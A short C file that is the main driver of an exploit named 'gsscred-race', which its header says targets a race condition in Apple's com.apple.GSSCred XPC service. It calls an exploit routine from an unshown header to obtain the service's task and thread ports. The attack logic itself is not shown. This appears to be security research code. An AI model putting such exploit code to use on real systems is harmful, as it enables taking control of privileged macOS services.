/*
 * gsscred-race
 * Brandon Azad
 *
 * Exploit a race condition in the com.apple.GSSCred XPC service.
 */

#include <stdio.h>

#include "gsscred_race.h"

int main(int argc, const char *argv[]) {
	mach_port_t gsscred_task, gsscred_thread;
	bool success = gsscred_race(&gsscred_task, &gsscred_thread);
	if (!success) {
		return 1;
	}
	thread_terminate(gsscred_thread);
	return 0;
}
